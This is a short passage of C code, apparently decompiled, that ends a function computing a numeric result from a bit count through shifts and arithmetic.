  DWORD v4, v5, v6;
  v4 = ((bits + 7) >> 3) & 7;
  v5 = (bits + 15) >> 4;
  v6 = 8 - v4;
  if(v4)
    v6 += 8;
  return 10 * ((v6 >> 1) + v5 + 2);
}